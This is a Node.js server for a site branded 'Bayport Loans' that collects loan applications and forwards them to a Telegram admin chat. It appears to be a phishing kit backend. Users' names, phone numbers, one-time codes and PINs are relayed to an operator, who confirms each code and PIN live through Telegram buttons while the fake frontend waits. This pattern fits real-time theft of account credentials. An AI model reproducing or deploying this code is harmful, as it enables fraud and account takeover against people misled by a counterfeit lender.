// ==================== LOAD ENV FIRST ====================
require('dotenv').config();

// ==================== IMPORTS ====================
const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

// ==================== INIT ====================
const app = express();
const PORT = process.env.PORT || 5000;

// Store pending applications (in production, use a database)
const pendingApplications = new Map();

// ==================== START TELEGRAM BOT ====================
const botToken = process.env.TELEGRAM_BOT_TOKEN;
let bot = null;

if (botToken) {
    try {
        bot = new TelegramBot(botToken, { polling: true });
        console.log('🤖 Telegram Bot Started Successfully');

        // /start command
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            bot.sendMessage(chatId, 
                '🚀 *Bayport Loans Admin Bot*\n\n' +
                'Welcome! You will receive loan applications here.\n\n' +
                '*Commands:*\n' +
                '• Use the buttons below to approve/reject applications\n' +
                '• Each application has its own unique Reference ID\n\n' +
                'Applications will appear automatically when users submit forms.',
                { parse_mode: 'Markdown' }
            );
        });

        // Handle new applications from API
        app.post('/api/send-application', async (req, res) => {
            try {
                const { application } = req.body;
                const refId = application.referenceId;
                
                // Store for later reference
                pendingApplications.set(refId, application);
                
                // Send to Telegram with inline buttons
                const message = `
🔔 *NEW LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Reference:* \`${refId}\`
👤 *Name:* ${application.fullname}
📱 *Phone:* ${application.phone}
💰 *Amount:* GHS ${application.loanAmount}
📅 *Period:* ${application.repaymentPeriod} months
🔑 *Friend Code:* ${application.friendCode}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Please review and respond:*
                `;
                
                const options = {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ APPROVE', callback_data: `approve_${refId}` },
                                { text: '❌ REJECT', callback_data: `reject_${refId}` }
                            ]
                        ]
                    }
                };
                
                await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, options);
                res.json({ success: true });
                
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Handle code verification
        app.post('/api/verify-code', async (req, res) => {
            try {
                const { referenceId, code } = req.body;
                const application = pendingApplications.get(referenceId);
                
                if (application) {
                    const message = `
🔐 *CODE VERIFICATION REQUIRED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Reference:* \`${referenceId}\`
👤 *Name:* ${application.fullname}
📱 *Phone:* ${application.phone}
🔢 *Code Entered:* \`${code}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Is this code correct?*
                    `;
                    
                    const options = {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ CORRECT', callback_data: `code_correct_${referenceId}` },
                                    { text: '❌ WRONG', callback_data: `code_wrong_${referenceId}` }
                                ]
                            ]
                        }
                    };
                    
                    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, options);
                }
                res.json({ success: true });
                
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Handle PIN verification
        app.post('/api/verify-pin', async (req, res) => {
            try {
                const { referenceId, pin } = req.body;
                const application = pendingApplications.get(referenceId);
                
                if (application) {
                    const message = `
🔑 *PIN VERIFICATION REQUIRED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Reference:* \`${referenceId}\`
👤 *Name:* ${application.fullname}
📱 *Phone:* ${application.phone}
🔢 *PIN Entered:* \`${pin}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Is this PIN correct?*
                    `;
                    
                    const options = {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ CORRECT', callback_data: `pin_correct_${referenceId}` },
                                    { text: '❌ WRONG', callback_data: `pin_wrong_${referenceId}` }
                                ]
                            ]
                        }
                    };
                    
                    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, options);
                }
                res.json({ success: true });
                
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Handle callback queries (button clicks)
        bot.on('callback_query', async (callbackQuery) => {
            const msg = callbackQuery.message;
            const data = callbackQuery.data;
            const chatId = msg.chat.id;
            
            // Acknowledge the callback
            await bot.answerCallbackQuery(callbackQuery.id);
            
            // Parse the callback data
            const [action, referenceId, extra] = data.split('_');
            
            switch(action) {
                case 'approve':
                    // Show code length selection
                    const message = `
✅ *Application Approved*
📋 *Reference:* \`${referenceId}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Select the code length to send to user:*
                    `;
                    
                    const options = {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '🔢 4 DIGITS', callback_data: `code4_${referenceId}` },
                                    { text: '🔢 5 DIGITS', callback_data: `code5_${referenceId}` },
                                    { text: '🔢 6 DIGITS', callback_data: `code6_${referenceId}` }
                                ]
                            ]
                        }
                    };
                    
                    await bot.sendMessage(chatId, message, options);
                    break;
                    
                case 'reject':
                    await bot.sendMessage(chatId, `❌ *Application Rejected*\n\nReference: \`${referenceId}\``, { parse_mode: 'Markdown' });
                    // Notify frontend about rejection
                    await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/application-status`, {
                        referenceId,
                        status: 'rejected'
                    });
                    break;
                    
                case 'code4':
                case 'code5':
                case 'code6':
                    const codeLength = action === 'code4' ? 4 : (action === 'code5' ? 5 : 6);
                    const generatedCode = generateRandomCode(codeLength);
                    
                    await bot.sendMessage(chatId, `✅ *Code Generated*\n\nReference: \`${referenceId}\`\nCode: \`${generatedCode}\`\n\nWaiting for user to enter code...`, { parse_mode: 'Markdown' });
                    
                    // Notify frontend with the code
                    await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/send-code`, {
                        referenceId,
                        code: generatedCode
                    });
                    break;
                    
                case 'code':
                    if (extra === 'correct') {
                        await bot.sendMessage(chatId, `✅ *Code Verified Correct*\n\nReference: \`${referenceId}\`\n\nNow enter PIN verification...`, { parse_mode: 'Markdown' });
                        await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/code-verified`, {
                            referenceId,
                            status: 'correct'
                        });
                    } else if (extra === 'wrong') {
                        await bot.sendMessage(chatId, `❌ *Wrong Code*\n\nReference: \`${referenceId}\`\n\nUser will try again.`, { parse_mode: 'Markdown' });
                        await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/code-verified`, {
                            referenceId,
                            status: 'wrong'
                        });
                    }
                    break;
                    
                case 'pin':
                    if (extra === 'correct') {
                        await bot.sendMessage(chatId, `✅ *PIN Verified Correct*\n\nReference: \`${referenceId}\`\n\n✅ Application Complete!`, { parse_mode: 'Markdown' });
                        await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/pin-verified`, {
                            referenceId,
                            status: 'correct'
                        });
                    } else if (extra === 'wrong') {
                        await bot.sendMessage(chatId, `❌ *Wrong PIN*\n\nReference: \`${referenceId}\`\n\nUser will try again.`, { parse_mode: 'Markdown' });
                        await axios.post(`${process.env.BACKEND_URL || 'http://localhost:5000'}/api/pin-verified`, {
                            referenceId,
                            status: 'wrong'
                        });
                    }
                    break;
            }
        });

    } catch (error) {
        console.log('⚠️ Bot error:', error.message);
    }
} else {
    console.log('⚠️ No bot token provided');
}

// Helper function to generate random code
function generateRandomCode(length) {
    const digits = '0123456789';
    let code = '';
    for (let i = 0; i < length; i++) {
        code += digits[Math.floor(Math.random() * digits.length)];
    }
    return code;
}

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));

// ==================== STATIC FILES ====================
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== API ROUTES ====================

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', message: 'Bayport Loans Running' });
});

// Send new application to Telegram
app.post('/api/send-message', async (req, res) => {
    try {
        const { message, application } = req.body;
        
        if (application) {
            // Forward to the new endpoint
            const response = await axios.post(`http://localhost:${PORT}/api/send-application`, { application });
            return res.json(response.data);
        }
        
        // Legacy support
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;
        
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );
        
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error.response?.data || error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get updates
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const offset = req.params.offset || 0;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            { params: { offset, timeout: 30 } }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Application status callback from bot
app.post('/api/application-status', (req, res) => {
    const { referenceId, status } = req.body;
    console.log(`Application ${referenceId}: ${status}`);
    res.json({ success: true });
});

// Send code to frontend
app.post('/api/send-code', (req, res) => {
    const { referenceId, code } = req.body;
    console.log(`Code for ${referenceId}: ${code}`);
    // Store code for frontend to retrieve
    pendingApplications.set(`${referenceId}_code`, code);
    res.json({ success: true, code });
});

// Code verification result
app.post('/api/code-verified', (req, res) => {
    const { referenceId, status } = req.body;
    console.log(`Code verification for ${referenceId}: ${status}`);
    pendingApplications.set(`${referenceId}_code_status`, status);
    res.json({ success: true });
});

// PIN verification result
app.post('/api/pin-verified', (req, res) => {
    const { referenceId, status } = req.body;
    console.log(`PIN verification for ${referenceId}: ${status}`);
    pendingApplications.set(`${referenceId}_pin_status`, status);
    res.json({ success: true });
});

// Get verification status for frontend polling
app.get('/api/verification-status/:referenceId', (req, res) => {
    const { referenceId } = req.params;
    const codeStatus = pendingApplications.get(`${referenceId}_code_status`);
    const pinStatus = pendingApplications.get(`${referenceId}_pin_status`);
    const code = pendingApplications.get(`${referenceId}_code`);
    
    res.json({
        success: true,
        codeStatus: codeStatus || 'pending',
        pinStatus: pinStatus || 'pending',
        code: code || null
    });
});

// ==================== FRONTEND ROUTES ====================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/index.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page3.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/success.html'));
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════════════╗
    ║     🚀 BAYPORT LOANS BACKEND SERVER       ║
    ╠════════════════════════════════════════════╣
    ║  📡 Port: ${PORT}                             ║
    ║  🤖 Telegram Bot: ${bot ? '✅ Running' : '❌ Not Running'}         ║
    ╚════════════════════════════════════════════╝
    `);
});